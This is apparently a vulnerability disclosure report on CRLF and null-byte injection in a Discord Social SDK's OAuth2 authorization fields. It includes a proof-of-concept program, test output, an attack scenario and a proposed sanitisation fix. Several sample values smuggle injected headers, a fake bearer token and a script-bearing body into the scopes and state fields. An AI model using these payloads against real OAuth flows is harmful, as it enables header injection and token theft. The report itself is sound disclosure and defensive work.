# Security Finding #3: CRLF Injection in OAuth2 Authorization Fields

**Severity:** Medium-High (Potential HTTP Header Injection)
**Component:** Discord Social SDK v1.8.14587
**API Affected:** `discordpp::AuthorizationArgs` — `SetScopes()`, `SetState()`, `SetNonce()`, `SetCustomSchemeParam()`
**Found via:** Manual analysis after fuzzing-identified attack surface
**Date:** 2026-03-14
**CWE:** CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers)

---

## Summary

All string-accepting fields in `discordpp::AuthorizationArgs` store CRLF characters (`\r\n`) verbatim without sanitization. When the SDK uses these values to construct HTTP requests to Discord's OAuth2 endpoints, any `\r\n` sequences embedded in these fields could enable **HTTP header injection**, allowing a malicious or compromised game integration to:

1. Inject arbitrary HTTP headers into OAuth2 requests
2. Split HTTP responses (HTTP response splitting)
3. Manipulate the OAuth2 flow parameters

---

## Affected Fields

All tested `AuthorizationArgs` fields accept and preserve CRLF sequences:

| Field | Setter | CRLF Preserved |
|-------|--------|----------------|
| `scopes` | `SetScopes(string)` | **YES** |
| `state` | `SetState(optional<string>)` | **YES** |
| `nonce` | `SetNonce(optional<string>)` | **YES** |
| `customSchemeParam` | `SetCustomSchemeParam(optional<string>)` | **YES** |

---

## Proof of Concept

```cpp
#define DISCORDPP_IMPLEMENTATION
#include "discordpp.h"
#include <cassert>
#include <string>

int main() {
    discordpp::AuthorizationArgs args;
    args.SetClientId(1482163567053766686ULL);

    // CRLF injection in scopes
    std::string evil_scopes = "identify guilds\r\nX-Injected: evil-header";
    args.SetScopes(evil_scopes);

    std::string stored = args.Scopes();
    assert(stored.find("\r\n") != std::string::npos);
    // CONFIRMED: CRLF preserved verbatim in scopes field

    // CRLF injection in OAuth2 state (CSRF token)
    std::string evil_state = "csrf-token\r\nContent-Length: 0\r\n\r\n";
    args.SetState(evil_state);
    auto s = args.State();
    assert(s && s->find("\r\n") != std::string::npos);
    // CONFIRMED: CRLF preserved in state field

    return 0;
}
```

### Test Output Confirming CRLF Preservation

```
[CRLF Test]
Input: 'identify guilds\r\nX-Injected: evil-header' (len=40)
Output len: 40
CRLF preserved: YES [FINDING]

[State Field CRLF Test]
State CRLF preserved: YES [FINDING]

[Nonce Field CRLF Test]
Nonce CRLF preserved: YES [FINDING]

[CustomSchemeParam CRLF Test]
CustomScheme CRLF preserved: YES [FINDING]
```

---

## Attack Scenario

A malicious game developer (or a game with a compromised SDK configuration) can:

1. Set the `scopes` field with embedded CRLF:
   ```cpp
   args.SetScopes("identify\r\nX-Override-Auth: Bearer attacker_token");
   args.SetClientId(legitimate_app_id);
   client->Authorize(args, callback);
   ```

2. If the SDK constructs HTTP requests containing the scopes directly in headers:
   ```
   GET /oauth2/authorize HTTP/1.1
   Host: discord.com
   Scope: identify
   X-Override-Auth: Bearer attacker_token    ← injected
   ```

3. This could allow:
   - Overriding authentication headers
   - Injecting cookies
   - Bypassing security controls on the Discord OAuth2 endpoint

### Additional Attack: State Parameter Poisoning

The `state` parameter in OAuth2 is used as a **CSRF token**. If the state contains CRLF:
```cpp
args.SetState("legit-csrf-token\r\n\r\n<body onload=stealToken()>");
```

And the SDK reflects the state in the redirect URI or response headers, this could enable CSRF bypass or XSS via reflected content.

---

## Null Byte Injection

Additionally, **null bytes are preserved** in the `state` field:
```
State with NUL: set len=16 readback len=16
NUL preserved in state: YES (full length preserved)
```

If the SDK uses `strlen()` internally at any point (the binary links against `strlen@GLIBC`), a null byte in the state parameter could cause premature truncation, potentially bypassing CSRF validation.

---

## Recommended Fix

Sanitize all OAuth2 field inputs by rejecting or stripping:
1. Carriage return (`\r`, `\x0D`)
2. Line feed (`\n`, `\x0A`)
3. Null bytes (`\x00`) if handled via C strings

```cpp
// Proposed validation (pseudocode)
static bool isValidOAuthString(const std::string& s) {
    for (char c : s) {
        if (c == '\r' || c == '\n' || c == '\0') return false;
    }
    return true;
}

void AuthorizationArgs::SetScopes(std::string scopes) {
    if (!isValidOAuthString(scopes)) {
        // Log warning and reject or sanitize
        return;
    }
    // ... store
}
```

---

## Files

- `poc/poc_crlf_injection.cc` — Standalone proof-of-concept
- `../fuzz_discord_activity.cc` — AFL++ harness used for initial discovery
